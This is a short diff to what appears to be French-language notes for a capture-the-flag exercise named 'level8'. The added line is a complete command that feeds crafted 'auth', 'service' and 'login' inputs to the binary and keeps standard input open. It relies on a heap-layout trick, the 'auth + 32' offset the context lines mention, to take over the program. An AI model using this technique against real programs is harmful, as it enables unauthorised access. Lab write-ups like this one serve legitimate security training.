@@ -16,3 +16,6 @@ Il y aura donc le premier caractere de service a auth + 32, qui sera 'z'. Ca mar
 Il faut taper :
 
 login
+
+au final :
+cat <(echo -e "auth pouet\nservice x\nservice z\nlogin") - | ./level8
